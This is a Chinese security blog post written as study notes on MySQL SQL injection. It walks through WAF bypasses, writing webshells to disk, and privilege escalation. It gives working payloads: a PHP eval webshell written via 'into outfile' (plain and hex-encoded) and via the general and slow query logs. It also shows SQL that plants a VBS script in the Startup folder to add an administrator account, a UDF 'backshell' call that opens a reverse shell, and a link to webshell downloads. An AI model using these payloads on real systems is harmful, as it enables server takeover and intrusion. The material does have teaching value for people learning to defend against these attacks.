# 六问MySQL？你敢来挑战吗？

阅读量 **500818**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-02 16:30:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t0139459dd0b74ec198.jpg)

很久之前就想总结一篇SQL注入及其更深一层的渗透方面的笔记了，奈何一是下不了决心，二是（好吧，还是下不了决心）

![](https://p3.ssl.qhimg.com/t01753ecf1fa281ebb4.png)

今天无意之间翻找出自己之前学习做的笔记，决定重新整理、学习、分享，若其中有什么错误，还希望您们能够及时提出来。（本文主要以MySQL，后期还要学习MSSQL、Oracle）

## 一问？何为SQL注入

所谓SQL注入，就是用户在Web表单等能与数据库交互的地方构造特殊的SQL命令，欺骗服务器执行，泄露数据库的信息，甚至getshell。

![](https://p3.ssl.qhimg.com/t019dbcf3b462d119b8.png)

## 二问？种类如何划分

###  （1）以注入点分类

数字型注入  
字符型注入  
搜索型注入  
宽字节注入  
Base64变形注入

###  （2）以提交方式分类

GET注入  
POST注入  
Cookie注入  
XFF注入  
User_Agent注入

###  （3）以执行效果分类

联合注入  
报错注入  
时间盲注  
布尔盲注  
堆注入

由于篇幅问题（主要是懒╰（‵□′）╯）在这里，就不详细介绍每一种注入的详情了，可直接针对某一种百度，会出现很多优秀的讲解和实战文章的。

![](https://p3.ssl.qhimg.com/t01309078b43cf5a30d.png)

## 三问？涵盖哪些常用函数

###  （1）字符串截取函数

mid(string,start[,length])  
left(string,length)  
substr(string,start,length)  
substring(string,start,length)

###  （2）字符串编码转换函数

ascii()  
ord()  
hex()  
unhex()

###  （3）字符串连接函数

concat(str1,str2,str3,…):将多个字符串连接成一个字符串（中间任何一个参数为null，返回值就会为null）  
concat_ws(separater,str1,str2,..):和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符  
group_concat():将group by产生的同一个分组中的值连接起来，返回一个字符串结果。

###  （4）报错注入函数

floor()  
extractvalue()  
updatexml()  
exp()  
polygon()  
multipoint()  
GeometryCollection()  
multilinestring()  
multipolygon()  
linestring()  
报错注入函数常用的有前面5种。

###  （5）盲注函数

if(a,b,c):条件a为真，则b被执行，否则c被执行  
sleep()：休眠时间  
benchmark()：benchmark(count,expr)函数的执行结果就是将expr表达式执行count次数。  
注：对于盲注，还需结合前面介绍的函数（尤其是字符串截取函数）。此外，盲注的手工量比较大，可以结合burpsuite使用。

![](https://p5.ssl.qhimg.com/t015f8d3e83411b57c3.png)

## 四问？怎么花式绕墙

###  （1）手工绕过

（1.1） 绕过空格  
`注释符/**/、括号、加号、%20、%09、%0a、%0b、%0c、%0d、%a0、%00`  
（1.2）绕过引号  
`使用十六进制`  
（1.3）绕过逗号  
`（使用from、offest、join）`  
例如，对于limit绕过可以使用offset来绕过：  
`select * from users limit 0,1`  
等价于下面这条SQL语句  
`select * from users limit 1 offset 0`  
又比如：  
`select substr(database() from 1 for 1)`  
（1.4）绕过=  
`使用like、rlike、regexp或者使用>、<`  
（1.5）绕过“>”、”<”  
`使用greatest()、least()、between()`  
（贴一下在别人那儿学到的一个技巧，如下图）

![](https://p2.ssl.qhimg.com/t01a35bcdbf4d9c0c0f.png)

（1.6）绕过union、select、where

![](https://p0.ssl.qhimg.com/t017449bdb305e7cc96.png)

###  （2）sqlmap工具

sqlmap参数tamper自带了一些常见的绕过脚本：

![](https://p0.ssl.qhimg.com/t01bb72332c16958e93.png)

上述只是举了一小部分脚本，读者在使用sqlmap工具的时候可以尝试使用这些脚本绕过WAF设备。

## 五问？MySQL注入写shell的条件

###  （1）利用union select写入

into outfile=into dumpfile  
`?id=1 union select 1,"<?php [@eval](https://github.com/eval
"@eval")($_POST['ls']);?>",3 into outfile 'F:/7788/evil.php'`  
`?id=1 union select
1,0x223C3F70687020406576616C28245F504F53545B276C73275D293B3F3E22,3 into
outfile "F:/7788/evil.php"`

具体权限要求：  
✦secure_file_priv支持web目录文件导出  
✦数据库用户file权限  
✦获取物理途径

secure_file_priv 特性：  
secure_file_priv参数是用来限制load data，select…outfile，and load_file()传到哪个指定目录的。  
✔secure_file_priv的值为null时，表示限制mysql不允许导入或导出。  
✔secure_file_priv的值为某一路径时，表示限制mysql的导入或导出只能发生在该路径下  
✔secure_file_priv的值没有具体值时，表示不对mysql的导入或导出做限制

如何在MySQL查看secure_file_priv参数的值：  
`show global variables like '%secure%'`

![](https://p5.ssl.qhimg.com/t01576bc0624e883bce.png)

在mysql 5.6.34版本以后secure_file_priv的值默认为NULL。  
并且无法用sql语句对其进行修改，只能够通过修改windows下相应的配置文件my.ini，可执行以下语句查看MySQL的安装目录：  
`show global variables like '%datadir%'`

![](https://p3.ssl.qhimg.com/t010aa806670a8a14f1.png)

![](https://p5.ssl.qhimg.com/t013a503f3f2e7c8ef8.png)

![](https://p0.ssl.qhimg.com/t016843f49cea23f167.png)

加入：  
`secure_file_priv=''`

![](https://p4.ssl.qhimg.com/t013ddfde6062eb8cf7.png)

重启MySQL服务：

![](https://p0.ssl.qhimg.com/t019bae8b57371c4fbc.png)

这样修改后，就可以在任意目录进行数据导入导出了。也代表着能在有权限的任意文件夹下读写文件  
数据库有用户file权限：  
`select * from mysql.user where user='test'`

![](https://p5.ssl.qhimg.com/t0164f5e4b733e9f445.png)

满足了三个条件：  
`secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径`

![](https://p4.ssl.qhimg.com/t0164164efc2f4a61aa.png)

查看相应目录，生成成功。

![](https://p1.ssl.qhimg.com/t014deefc32000af1a7.png)

在实际环境中，写到web目录，再使用工具(菜刀、冰蝎、Godzilla)连接木马。  
如果实际环境是linux，则需要修改添加至my.cnf配置文件：

![](https://p4.ssl.qhimg.com/t01f33a2ee2d24916b0.png)

如果没有满足条件（secure_file_priv是默认值），导出文件自然不会成功：

![](https://p0.ssl.qhimg.com/t01ed084b26afbd292d.png)

但是该方式仅适用于联合注入。

###  （2）利用分隔符写入

当MySQL注入点为盲注或报错时，sqlmap的—os-shell命令可写入的前提条件是：  
`secure_file_priv支持web目录文件导出、数据库用户File权限、获取物理路径`  
执行以下语句：  
`select 1 into outfile 'F:/7788/evil.php' lines terminated by
0x3C3F70687020406576616C28245F504F53545B2767275D293B3F3E0D0A;`

![](https://p3.ssl.qhimg.com/t01c0fe2aad226842c8.png)

![](https://p5.ssl.qhimg.com/t0174cedc7443581c6d.png)

![](https://p0.ssl.qhimg.com/t014093bb2891378d14.png)

###  （3）利用log写入

但是现在新版本的MySQL设置了导出文件的路径，我们基本上也没有权限去修改配置文件，更无法通过使用select into
outfile来写入一句话。这时，我们可以通过修改MySQL的log文件来获取Webshell。  
同样的具体权限要求：  
`数据库用户需具备super和file服务器权限、获取物理路径`  
查看日志是否开启：  
`show global variables like '%general%'`

![](https://p5.ssl.qhimg.com/t016db7749f65a76020.png)

一般这个日志记录是默认关闭的，需要我们手动开启。

`set global general_log = on;`

![](https://p4.ssl.qhimg.com/t018a03693b7589a616.png)

![](https://p5.ssl.qhimg.com/t017baf4a3edc3811cd.png)

修改日志路径(该路径需要设置到web目录下以便可访问)：  
`set global general_log_file='F:\\7788\\shell.php'`

![](https://p4.ssl.qhimg.com/t011b7acdb76be6332e.png)

相应目录下创建一个shell.php文件，如下：

![](https://p4.ssl.qhimg.com/t01134d6591255020e3.png)

写入shell：  
`select '<?php [@eval](https://github.com/eval "@eval")($_[tools]);?>'`

![](https://p5.ssl.qhimg.com/t015ad3b432f6ea1518.png)

![](https://p3.ssl.qhimg.com/t01734c25bc887ce65f.png)

###  （4）慢日志记录

同样的具体权限要求：  
`数据库用户需具备super和file服务器权限、获取物理路径`

![](https://p0.ssl.qhimg.com/t01d0d5043961be1ac1.png)

slow_query_log：慢日志功能开关  
slow_query_log_file：慢日志存放文件位置，自己设置  
开启慢日志：

![](https://p0.ssl.qhimg.com/t01ed6a6529c182bb7f.png)

更改路径：

![](https://p5.ssl.qhimg.com/t0172d7908217f08965.png)

![](https://p2.ssl.qhimg.com/t01354ecf5171f1826a.png)

向日志文件写入shell：  
`select '<?php phpinfo();?>' or sleep(10)`

![](https://p3.ssl.qhimg.com/t01428c7370397b057a.png)

![](https://p3.ssl.qhimg.com/t01e428bd4534c84000.png)

慢日志查询：当查询语句执行的时间超过系统默认的时间时,该语句才会被记入进慢查询日志。  
时间默认超过多少的称为慢查询日志？  
`show global variables like '%query_time%'`

![](https://p3.ssl.qhimg.com/t01318e49f2535e7723.png)

如果查询时间大于等于了上述时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。  
如果是9秒，就不会被记录：

![](https://p5.ssl.qhimg.com/t018cb856baa0f5f192.png)

![](https://p1.ssl.qhimg.com/t016acdb55a35374ae9.png)

## 六问？常见提权手段

MySQL和MsSQL提权方式不一样，本文先主要研究MySQL。  
提权的前置条件是拿到一个高权限的数据库管理员账号。

###  （1）UDF提权

UDF即User defined
function，用户自定义函数的一个MySQL拓展接口。在获得root权限将文件udf.dll导出到系统目录下，可以通过udf.dll创建执行系统命令的函数来调用执行cmd。（这里用到了“导出”，那么就需要参数secure-file-priv为空）

该udf.dll导出的路径因MySQL版本不同而不同：  
1）如果`MySQL<5.1`，udf.dll动态链接文件需要导出的路径为：  
Windows2003：c:\windows\system32  
Windows2000：c:\winnt\system32。  
2）如果`MySQL>=5.1`，必须要把udf.dll动态链接文件导出到MySQL的安装目录：  
….\MySQL\lib\plugin

![](https://p2.ssl.qhimg.com/t01374cd2a2e4379ec1.png)

然而，上面显示的默认路径对应的文件夹是不存在的，比如我的就不存在：

![](https://p5.ssl.qhimg.com/t01e10af24290cd6026.png)

这就需要“手工”创建了。

当然这里的手工并不像在本地创建一个文件夹那么简单。企图使用NTFS流创建：  
`select 'x' into dumpfile
'D:/phpstudy_pro/Extensions/MySQL5.7.26/lib::$INDEX_ALLOCATION';  
select 'x' into dumpfile`
`'D:/phpstudy_pro/Extensions/MySQL5.7.26/lib/plugin/::$INDEX_ALLOCATION';`  
无奈“Permission denied”：

![](https://p0.ssl.qhimg.com/t010dc2a7154605cdee.png)

一般我们在前面获取到shell之后，可以另外上传某些特别的webshell（MySQL专用网页马）找到MySQL的安装目录，然后创建\lib\plugin。（总之，反正必须想方设法创建这个目录，有什么奇巧的可以交流交流）  
假装挑战成功，”手工”创建了该路径（机智如我）

那么接下来要解决的是udf.dll怎么来？（我之前以为是自带的）  
观摩优秀前辈们写的文章，主要是两种方式：  
1）sqlmap  
在sqlmap的`/usr/share/sqlmap/data`目录下，存在针对不同平台的udf：

![](https://p1.ssl.qhimg.com/t01a297633ec35165a3.png)

值得注意的是，sqlmap这些动态链接文件是经过异或编码的，所以直接下载到MySQL的plugin目录下是不行的。因此，需要sqlmap解码后再进行下载。  
切换到以下（Linux）目录：  
`/usr/share/sqlmap/extra/cloak`  
然后执行：  
`python3 cloak.py -d -i
/usr/share/sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_`  
就会生成一个dll文件，将该dll文件下载至MySQL的plugin目录下：

![](https://p3.ssl.qhimg.com/t01992931682d368512.png)

这是一种获取udf.dll文件的方式，下面介绍另一种方式。  
2）metasploit  
启动msf：

![](https://p0.ssl.qhimg.com/t017cfe017689ec871e.png)

使用msf自带的mysql_udf_payload：

![](https://p1.ssl.qhimg.com/t01fa9e84fb452c5444.png)

设置上面的`PASSWORD`、`RHOST`、`USERNAME`、`RPORT`等基本信息，就可以`exploit`。  
补充一句：目标的3306能外联才能有效。否则，就会出现以下错误：

![](https://p2.ssl.qhimg.com/t01d780764df26da467.png)

下载完dll文件，就可以自定义函数了。

![](https://p0.ssl.qhimg.com/t01616b6c83ee3726ab.png)

不过，自定义函数并不是真的自定义，需要在它符合的函数范围里定义相应的函数（IDA可查看可导出的函数）：

![](https://p2.ssl.qhimg.com/t01ed393877685d4411.png)

否则：

![](https://p2.ssl.qhimg.com/t01aec84b99d49c0213.png)

`create function sys_eval returns string soname "lib_mysqludf_sys.dll"`

![](https://p1.ssl.qhimg.com/t0157f634787f3c3d3f.png)

`select * from mysql.func`

![](https://p5.ssl.qhimg.com/t01d6aa3445b289f065.png)

![](https://p1.ssl.qhimg.com/t0161c4fc6230fbad60.png)

删除自定义函数：`drop function sys_eval;`  
3）udf.shell  
上面两种方法适合再目标及可以外联的情况，如果目标机在内网的情况，其实更多的是使用一些网页马，粗暴而又不失文雅！（php版本不一致可能导致马儿不起作用，可自行修改）  
马儿地址下载：[https://github.com/echohun/tools/blob/master/大马](https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC)  
1号马儿:

![](https://p3.ssl.qhimg.com/t01c0a421318b1d5347.png)

2号马儿：

![](https://p4.ssl.qhimg.com/t01d3eeb52303189401.png)

![](https://p0.ssl.qhimg.com/t0103dbc99f9bc8f7dd.png)

###  （2）MOF提权

.mof文件扩展名代表管理对象格式（MOF）及其相关文件类型（.mof）。MOF文件主要用于（传统的）微软系统管理服务器（SMS）软件。在系统中心配置管理器中，自2007年起，微软SMS的后继者，不需要.mof文件，但仍然可以导入。

![](https://p2.ssl.qhimg.com/t011841c7710413773b.png)

在Window中，`C:\Windows\System32\wbem\MOF`目录下的mof文件每隔几秒的时间就会被执行。在mof种嵌入vbs脚本，就可以这个脚本来执行系统命令。该提权操作也是有限制条件的，即MySQL有权限操作mof目录。  
我再本地访问这个文件夹，Windows出于安全考虑就会提示是否使用管理员权限。

![](https://p4.ssl.qhimg.com/t017a0baa78e42a9a44.png)

该提权的思路就是获取mof文件  
（可以自己编写一个，也可以利用msf的一个提权模块：`use exploit/windows/mysq1/mysq1_ mof`），  
利用MySQL写文件的特性可以写入`C:\Windows\System32\wbem\MOF`。（但是实际环境种操作起来，一般还是不会成功，毕竟前置条件还是挺苛刻的）

###  （3）启动项提权

Windows开机的时候，会有一些开机自启动的程序，此时的程序启动启用的是system权限。利用这一特性，可将我们的vbs脚本通过MySQL导出到启动项中。  
在前面，获取到os-shell后，新建一个表，将vbs脚本一句一句存入表中，最后再导出：  
`show databases ;#展示当前有什么数据库`  
`use test; #使用其中一个数据库，或者创建一个数据库`  
`show tables; #显示该数据库下有什么表`  
`create table a (cmd text); #创建一个新表，然后一句一句插入vbs脚本`  
`insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );`  
`insert into a values ("a=wshshell.run (""cmd.exe /c net user ws/add"",0)") ;  
添加新用户`  
`insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup
Administrators ws /add"",0) " );  
将新用户添加到管理员组`

![](https://p0.ssl.qhimg.com/t01d234f9ae20a41c67.png)

![](https://p1.ssl.qhimg.com/t01e64b3ac8b4e42613.png)

（vbs脚本可根据自己的需要进行修改替换）接下来就利用MySQL的导出写文件特性（`secure_file_priv`没有限制），导出vbs脚本到本地的启动路径中：  
Windows10：`C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup`

![](https://p4.ssl.qhimg.com/t01a5dfe7ef74be3602.png)

尝试失败！估计用户名是中文，还有可能权限不够吧。  
总之这是一条思路，提权的方式这种不行再试下一种。  
如果能够写入成功，下一次系统用户重启电脑时，就可以得到高权限。

###  （4）反连端口提权

这种方式时udf提权的一种延伸吧。当使用udf提权时，如若系统函数被WAF过滤，udf自定义函数中有一个`backshell`，可进行端口转发，绕过。  
创建该函数：  
mysql > `create function backshell returns strings soname 'udf.dll';`  
服务器端设置好监听，然后直接反弹 shell ：  
mysql > `select backshell("10.20.xxx.xxx", 445);`

**至此，六问？你学会了吗？**  

参考链接：  
<https://www.sqlsec.com/2020/11/mysql.html#toc-heading-21>  
<https://www.heibai.org/post/1028.html>  
<https://zhuanlan.zhihu.com/p/144061985>  
<https://www.cnblogs.com/c1e4r/articles/8902444.html>  
<https://www.cnblogs.com/xiaozi/p/12767050.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wholesome** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235236](/post/id/235236)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [MySQL](/tag/MySQL)

 **+1** __36赞

 __收藏

![](https://p4.ssl.qhimg.com/t01ba3c32bd89918daf.png) wholesome

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

